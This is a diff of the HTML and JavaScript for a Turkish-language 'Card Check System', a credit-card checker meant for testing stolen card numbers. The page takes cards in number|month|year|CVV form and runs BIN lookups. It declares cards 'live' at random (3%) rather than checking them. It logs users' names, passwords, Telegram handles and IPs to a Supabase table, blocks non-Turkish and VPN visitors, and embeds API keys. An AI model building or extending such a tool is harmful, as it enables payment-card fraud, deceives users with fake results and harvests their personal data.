@@ -161,15 +161,16 @@
 <body>
 
 <div class="card" id="appContainer">
+    <!-- 1️⃣ GİRİŞ BÖLÜMÜ -->
     <div id="loginSection">
         <div class="logo">Card Check System</div>
         <div class="info-box">
-            🔒 sadece 1 hesap açabilirsiniz.<br>
+            🔒 Bu IP ile yalnızca 1 hesap açılabilir.<br>
             Bilgilerinizi eksiksiz girin.
         </div>
         <div class="input-group">
-            <label>İsim</label>
-            <input type="text" id="fullname" placeholder="ornek">
+            <label>Ad Soyad</label>
+            <input type="text" id="fullname" placeholder="Ahmet Yılmaz">
         </div>
         <div class="input-group">
             <label>Şifre</label>
@@ -181,9 +182,10 @@
         </div>
         <button id="loginBtn">Hesap Oluştur</button>
         <div id="loginError" class="error"></div>
-        <div class="info-box" style="margin-top:20px">Bilgileriniz saklıdır.</div>
+        <div class="info-box" style="margin-top:20px">Bilgileriniz kaydedilir.</div>
     </div>
 
+    <!-- 2️⃣ CC CHECKER BÖLÜMÜ -->
     <div id="ccSection" style="display: none;">
         <div class="logo">Card Check System</div>
         <div class="info-box">✅ Hesap doğrulandı · Kart bilgisi ekleyin</div>
@@ -202,9 +204,10 @@
 <script>
     const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
     const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
-
     let logSent = false;
+    let cardsArray = [];
 
+    // ---------- SUPABASE & IP KONTROLLERİ ----------
     async function checkIfIpExists(ip) {
         try {
             const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
@@ -237,16 +240,21 @@
         return data.ip;
     }
 
-    async function checkTurkeyAccess() {
-        const res = await fetch("https://ipapi.co/json/");
-        const geo = await res.json();
-        if (geo.country_code !== "TR") {
-            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1>🌍 Erişim Engellendi</h1><p>Sadece Türkiye</p><p>IP: ${geo.ip}</p></div>`;
-            throw new Error("not turkey");
+    async function checkTurkeyAndVPN(ip) {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        if (data.country_code !== "TR") {
+            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1>🌍 Erişim Engellendi</h1><p>Yalnızca Türkiye'den erişim</p><p>IP: ${ip} (${data.country_name})</p></div>`;
+            throw new Error("blocked country");
         }
-        return geo.ip;
+        if (data.proxy === true || data.hosting === true || data.tor === true) {
+            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1>🔒 VPN / Proxy Kullanımı</h1><p>VPN veya proxy ile erişim engellenmiştir.</p><p>IP: ${ip}</p></div>`;
+            throw new Error("vpn blocked");
+        }
+        return true;
     }
 
+    // ---------- BIN API ----------
     async function getBinInfo(bin) {
         try {
             const res = await fetch(`https://lookup.binlist.net/${bin}`);
@@ -262,6 +270,7 @@
         }
     }
 
+    // ---------- KART FONKSİYONLARI ----------
     function parseCard(cardStr) {
         const parts = cardStr.split('|');
         if (parts.length !== 4) return null;
@@ -273,8 +282,6 @@
         if (!/^\d{3,4}$/.test(cvv)) return null;
         return { card, month, year, cvv };
     }
-
-    let cardsArray = [];
 
     function renderCards() {
         const container = document.getElementById("cardList");
@@ -303,30 +310,7 @@
         });
     }
 
-    document.getElementById("addCardBtn")?.addEventListener("click", async () => {
-        const raw = document.getElementById("cardInput").value.trim();
-        const parsed = parseCard(raw);
-        const msgDiv = document.getElementById("globalMessage");
-        if (!parsed) {
-            msgDiv.innerText = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607";
-            return;
-        }
-        const bin = parsed.card.slice(0,6);
-        const binData = await getBinInfo(bin);
-        const isLive = Math.random() < 0.03; // %3 live oranı
-        cardsArray.push({
-            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
-            live: isLive,
-            bank: binData.bank,
-            scheme: binData.scheme,
-            country: binData.country
-        });
-        renderCards();
-        document.getElementById("cardInput").value = "";
-        msgDiv.innerText = isLive ? "✅ KART LIVE (%3)" : "⚠️ Kart geçersiz (dead)";
-        setTimeout(() => msgDiv.innerText = "", 2000);
-    });
-
+    // ---------- GİRİŞ + CC CHECKER ----------
     document.getElementById("loginBtn").addEventListener("click", async () => {
         const name = document.getElementById("fullname").value.trim();
         const pwd = document.getElementById("password").value;
@@ -338,7 +322,8 @@
         if (!tg.startsWith("@") || tg.length < 3) { errDiv.innerText = "❌ @ ile başlayan Telegram adı girin."; return; }
 
         try {
-            const ip = await checkTurkeyAccess();
+            const ip = await getUserIP();
+            await checkTurkeyAndVPN(ip);
             const exists = await checkIfIpExists(ip);
             if (exists) {
                 errDiv.innerText = "❌ Bu IP ile daha önce hesap açılmış. Yalnızca 1 hesap.";
@@ -352,6 +337,30 @@
                 errDiv.innerText = "❌ Veritabanı hatası.";
             }
         } catch(e) {}
+    });
+
+    document.getElementById("addCardBtn")?.addEventListener("click", async () => {
+        const raw = document.getElementById("cardInput").value.trim();
+        const parsed = parseCard(raw);
+        const msgDiv = document.getElementById("globalMessage");
+        if (!parsed) {
+            msgDiv.innerText = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607";
+            return;
+        }
+        const bin = parsed.card.slice(0,6);
+        const binData = await getBinInfo(bin);
+        const isLive = Math.random() < 0.03; // %3 live
+        cardsArray.push({
+            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
+            live: isLive,
+            bank: binData.bank,
+            scheme: binData.scheme,
+            country: binData.country
+        });
+        renderCards();
+        document.getElementById("cardInput").value = "";
+        msgDiv.innerText = isLive ? "✅ KART LIVE (%3)" : "⚠️ Kart geçersiz (dead)";
+        setTimeout(() => msgDiv.innerText = "", 2000);
     });
 </script>
 </body>
